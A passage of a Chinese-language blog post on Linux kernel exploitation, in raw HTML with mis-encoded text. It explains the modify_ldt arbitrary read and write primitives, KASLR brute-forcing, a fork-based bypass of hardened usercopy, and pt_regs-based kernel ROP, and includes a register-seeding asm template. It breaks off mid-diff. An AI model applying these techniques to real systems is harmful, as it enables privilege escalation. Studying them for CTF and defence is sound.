href="#åˆ†é…ï¼ˆGFP-KERNELï¼‰ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”write-ldt" class="headerlink" title="åˆ†é…ï¼ˆGFP_KERNELï¼‰ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”write_ldt()"></a>åˆ†é…ï¼ˆGFP_KERNELï¼‰ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”write_ldt()</h3><p> å®šä¹‰äº <code>/arch/x86/kernel/ldt.c</code>ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ write_ldt() å½“ä¸­ä¼šä½¿ç”¨ alloc_ldt_struct() å‡½æ•°æ¥ä¸ºæ–°çš„ ldt_struct åˆ†é…ç©ºé—´ï¼Œéšåå°†ä¹‹åº”ç”¨åˆ°è¿›ç¨‹ï¼Œ alloc_ldt_struct() å‡½æ•°å®šä¹‰äº <code>arch/x86/kernel/ldt.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å³æˆ‘ä»¬å¯ä»¥é€šè¿‡ modify_ldt ç³»ç»Ÿè°ƒç”¨æ¥åˆ†é…æ–°çš„ ldt_struct</p><h3 id="æ•°æ®æ³„éœ²ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”read-ldt"><a href="#æ•°æ®æ³„éœ²ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”read-ldt" class="headerlink" title="æ•°æ®æ³„éœ²ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”read_ldt()"></a>æ•°æ®æ³„éœ²ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”read_ldt()</h3><p> å®šä¹‰äº <code>/arch/x86/kernel/ldt.c</code>ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼š<strong>ç›´æ¥è°ƒç”¨ copy_to_user å‘ç”¨æˆ·åœ°å€ç©ºé—´æ‹·è´æ•°æ®</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯è‹¥æ˜¯èƒ½å¤Ÿæ§åˆ¶ ldt-&gt;entries ä¾¿èƒ½å¤Ÿå®Œæˆå†…æ ¸çš„ä»»æ„åœ°å€è¯»ï¼Œç”±æ­¤æ³„éœ²å‡ºå†…æ ¸æ•°æ®</p><h4 id="â‘ -çˆ†ç ´å†…æ ¸-text-æ®µåœ°å€ä¸-page-offset-base"><a href="#â‘ -çˆ†ç ´å†…æ ¸-text-æ®µåœ°å€ä¸-page-offset-base" class="headerlink" title="â‘  çˆ†ç ´å†…æ ¸ .text æ®µåœ°å€ä¸ page_offset_base"></a>â‘  çˆ†ç ´å†…æ ¸ .text æ®µåœ°å€ä¸ page_offset_base</h4><p>å‰é¢è®²åˆ°è‹¥æ˜¯èƒ½å¤Ÿæ§åˆ¶ ldt-&gt;entries ä¾¿èƒ½å¤Ÿå®Œæˆå†…æ ¸çš„ä»»æ„åœ°å€è¯» ï¼Œä½†åœ¨å¼€å¯ KASLR çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥ä»å“ªé‡Œè¯»å–ä»€ä¹ˆæ•°æ®</p><p>è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ° <code>copy_to_user</code> çš„ä¸€ä¸ªç‰¹æ€§ï¼šå¯¹äºéæ³•åœ°å€ï¼Œå…¶<strong>å¹¶ä¸ä¼šé€ æˆ kernel panicï¼Œåªä¼šè¿”å›ä¸€ä¸ªéé›¶çš„é”™è¯¯ç </strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å¤šæ¬¡ä¿®æ”¹ ldt-&gt;entries å¹¶å¤šæ¬¡è°ƒç”¨ modify_ldt() ä»¥<strong>çˆ†ç ´å†…æ ¸ .text æ®µåœ°å€ä¸ page_offset_base</strong>ï¼Œè‹¥æ˜¯æˆåŠŸå‘½ä¸­ï¼Œåˆ™ modify_ldt ä¼šè¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªéè´Ÿå€¼</p><h4 id="â‘¡-åˆ©ç”¨-fork-å®Œæˆ-hardened-usercopy-ä¸‹çš„ä»»æ„åœ°å€è¯»"><a href="#â‘¡-åˆ©ç”¨-fork-å®Œæˆ-hardened-usercopy-ä¸‹çš„ä»»æ„åœ°å€è¯»" class="headerlink" title="â‘¡ åˆ©ç”¨ fork å®Œæˆ hardened usercopy ä¸‹çš„ä»»æ„åœ°å€è¯»"></a>â‘¡ åˆ©ç”¨ fork å®Œæˆ hardened usercopy ä¸‹çš„ä»»æ„åœ°å€è¯»</h4><p>å½“å†…æ ¸å¼€å¯äº† hardened usercopy æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥æœç´¢æ•´ä¸ªçº¿æ€§æ˜ å°„åŒºåŸŸï¼Œè¿™å› ä¸ºè¿™æœ‰å¯èƒ½è§¦å‘ hardened usercopy çš„æ£€æŸ¥</p><p>ldt æ˜¯ä¸€ä¸ªä¸è¿›ç¨‹å…¨å±€ç›¸å…³çš„ä¸œè¥¿ï¼Œå› æ­¤ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ°ä¸è¿›ç¨‹ç›¸å…³çš„å…¶ä»–æ–¹é¢ä¸Šâ€”â€”è§‚å¯Ÿ fork ç³»ç»Ÿè°ƒç”¨çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹æ‰§è¡Œé“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() å®šä¹‰äº <code>arch/x86/kernel/ldt.c</code> ä¸­ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼šé€šè¿‡ memcpy å°†çˆ¶è¿›ç¨‹çš„ ldt-&gt;entries æ‹·è´ç»™å­è¿›ç¨‹ï¼Œ<strong>æ˜¯å®Œå…¨å¤„åœ¨å†…æ ¸ä¸­çš„æ“ä½œ</strong>ï¼Œå› æ­¤ä¸ä¼šè§¦å‘ hardened usercopy çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åå†å¼€å­è¿›ç¨‹æ¥ç”¨ read_ldt() è¯»å–æ•°æ®å³å¯</p><h3 id="ä»»æ„åœ°å€å†™ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”write-ldt"><a href="#ä»»æ„åœ°å€å†™ï¼šmodify-ldt-ç³»ç»Ÿè°ƒç”¨â€”â€”write-ldt" class="headerlink" title="ä»»æ„åœ°å€å†™ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”write_ldt()"></a>ä»»æ„åœ°å€å†™ï¼šmodify_ldt ç³»ç»Ÿè°ƒç”¨â€”â€”write_ldt()</h3><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ° modify_ldt ç³»ç»Ÿè°ƒç”¨ä¸­çš„ <code>write_ldt()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œåœ¨ memcpy æ—¶æ‰€æ‹·è´çš„å­—èŠ‚æ•°ä¸º <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>ï¼Œå…¶ä¸­å‰è€…çš„ä¸Šé™å€¼ä¸åè€…éƒ½å®šä¹‰äº <code>arch/x86/include/uapi/asm/ldt.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure><p> é‚£ä¹ˆè¿™ä¸ªæ•°æ®é‡ç›¸å¯¹è¾ƒå¤§ï¼Œæ‹·è´éœ€è¦ç”¨åˆ°ä¸€å®šçš„æ—¶é—´ï¼Œè€Œåœ¨æ‹·è´ç»“æŸåæœ‰ä¸€å¥ <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>ï¼Œå…¶ä¸­ ldt ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨ memcpy è¿‡ç¨‹ä¸­å°† new_ldt-&gt;entries æ›´æ”¹ä¸ºæˆ‘ä»¬çš„ç›®æ ‡åœ°å€ä»è€Œå®Œæˆä»»æ„åœ°å€å†™</strong>ï¼Œå³ double fetch </p><h1 id="0x04-pt-regs-ä¸ç³»ç»Ÿè°ƒç”¨ç›¸å…³"><a href="#0x04-pt-regs-ä¸ç³»ç»Ÿè°ƒç”¨ç›¸å…³" class="headerlink" title="0x04.pt_regs ä¸ç³»ç»Ÿè°ƒç”¨ç›¸å…³"></a>0x04.pt_regs ä¸ç³»ç»Ÿè°ƒç”¨ç›¸å…³</h1><p>ä¸¥æ ¼æ„ä¹‰ä¸Šè€Œè¨€ï¼Œ<code>pt_regs</code> å¹¶éæ˜¯é€šè¿‡ slub åˆ†é…è€Œæ¥çš„ä¸€ä¸ªç»“æ„ä½“ï¼Œè€Œæ˜¯<strong>å›ºå®šä½äºå†…æ ¸æ ˆåº•çš„ä¸€ä¸ªç»“æ„ä½“</strong>ï¼Œç”±äºå…¶ä¸Šçš„æ•°æ®å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯éƒ¨åˆ†å¯æ§çš„ï¼Œå› æ­¤è¯¥ç»“æ„ä½“åœ¨å†…æ ¸åˆ©ç”¨å½“ä¸­ä¹Ÿèƒ½å‘æŒ¥ç›¸å½“çš„ä½œç”¨</p><h2 id="ç³»ç»Ÿè°ƒç”¨éƒ¨åˆ†è¿‡ç¨‹-ä¸-pt-regs-ç»“æ„ä½“"><a href="#ç³»ç»Ÿè°ƒç”¨éƒ¨åˆ†è¿‡ç¨‹-ä¸-pt-regs-ç»“æ„ä½“" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨éƒ¨åˆ†è¿‡ç¨‹ ä¸ pt_regs ç»“æ„ä½“"></a>ç³»ç»Ÿè°ƒç”¨éƒ¨åˆ†è¿‡ç¨‹ ä¸ pt_regs ç»“æ„ä½“</h2><p>ç³»ç»Ÿè°ƒç”¨çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿæˆ–è®¸ä¸å°‘äººéƒ½èƒ½å¤Ÿç­”å¾—ä¸Šæ¥æ˜¯ç”±æˆ‘ä»¬åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ç›¸åº”çš„å‚æ•°åæ‰§è¡Œ <code>syscall</code> è¿™ä¸€æ±‡ç¼–æŒ‡ä»¤ï¼Œé€šè¿‡é—¨ç»“æ„è¿›å…¥åˆ°å†…æ ¸ä¸­çš„ <code>entry_SYSCALL_64</code>è¿™ä¸€å‡½æ•°ï¼Œéšåé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¡¨è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°</p><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ° <code>entry_SYSCALL_64</code> è¿™ä¸€ç”¨æ±‡ç¼–å†™çš„å‡½æ•°å†…éƒ¨ï¼Œè§‚å¯Ÿï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°å…¶æœ‰ç€<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">è¿™æ ·ä¸€æ¡æŒ‡ä»¤</a>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€æ¡ååˆ†æœ‰è¶£çš„æŒ‡ä»¤ï¼Œå®ƒä¼šå°†æ‰€æœ‰çš„å¯„å­˜å™¨<strong>å‹å…¥å†…æ ¸æ ˆä¸Šï¼Œå½¢æˆä¸€ä¸ª pt_regs ç»“æ„ä½“</strong>ï¼Œè¯¥ç»“æ„ä½“å®è´¨ä¸Šä½äºå†…æ ¸æ ˆåº•ï¼š</p><p><a href="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png"><img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png"></a></p><p>è¯¥ç»“æ„ä½“çš„<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">å®šä¹‰</a>å¦‚ä¸‹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å†…æ ¸æ ˆ-ä¸-é€šç”¨-ROP"><a href="#å†…æ ¸æ ˆ-ä¸-é€šç”¨-ROP" class="headerlink" title="å†…æ ¸æ ˆ ä¸ é€šç”¨ ROP"></a>å†…æ ¸æ ˆ ä¸ é€šç”¨ ROP</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå†…æ ¸æ ˆ<strong>åªæœ‰ä¸€ä¸ªé¡µé¢çš„å¤§å°</strong>ï¼Œè€Œ pt_regs ç»“æ„ä½“åˆ™å›ºå®šä½äº<strong>å†…æ ¸æ ˆæ ˆåº•</strong>ï¼Œå½“æˆ‘ä»¬åŠ«æŒå†…æ ¸ç»“æ„ä½“ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ—¶ï¼ˆä¾‹å¦‚ seq_operations-&gt;startï¼‰ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡è¯¥å‡½æ•°æŒ‡é’ˆåŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶ <strong>rsp ä¸ æ ˆåº•çš„ç›¸å¯¹åç§»é€šå¸¸æ˜¯ä¸å˜çš„</strong></p><p>è€Œåœ¨ç³»ç»Ÿè°ƒç”¨å½“ä¸­è¿‡ç¨‹æœ‰å¾ˆå¤šçš„å¯„å­˜å™¨å…¶å®æ˜¯ä¸ä¸€å®šèƒ½ç”¨ä¸Šçš„ï¼Œæ¯”å¦‚ r8 ~ r15ï¼Œ<strong>è¿™äº›å¯„å­˜å™¨ä¸ºæˆ‘ä»¬å¸ƒç½® ROP é“¾æä¾›äº†å¯èƒ½ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼š</strong></p><ul><li><strong>åªéœ€è¦å¯»æ‰¾åˆ°ä¸€æ¡å½¢å¦‚ â€œadd rsp, val ; retâ€ çš„ gadget ä¾¿èƒ½å¤Ÿå®Œæˆ ROP</strong></li></ul><blockquote><p>è¿™æ˜¯ä¸€ä¸ªæ–¹ä¾¿è¿›è¡Œè°ƒè¯•çš„æ¿å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></blockquote><p>ä¾‹é¢˜ï¼š<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B-easykernel">è¥¿æ¹–è®ºå‰‘ 2021 çº¿ä¸Šåˆèµ› - easykernel</a></p><h3 id="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•"><a href="#æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨-pt-regs-è¿›è¡Œæ”»å‡»çš„åŠæ³•" class="headerlink" title="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•"></a>æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—åˆ©ç”¨ pt_regs è¿›è¡Œæ”»å‡»çš„åŠæ³•</h3><p>æ­£æ‰€è°“é­”é«˜ä¸€å°ºé“é«˜ä¸€ä¸ˆï¼Œå†…æ ¸ä¸»çº¿åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">è¿™ä¸ª commit</a> ä¸­ä¸ºç³»ç»Ÿè°ƒç”¨æ ˆ<strong>æ·»åŠ äº†ä¸€ä¸ªåç§»å€¼ï¼Œè¿™æ„å‘³ç€ pt_regs ä¸æˆ‘ä»¬è§¦å‘åŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶çš„æ ˆé—´åç§»å€¼ä¸å†æ˜¯å›ºå®šå€¼</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">index 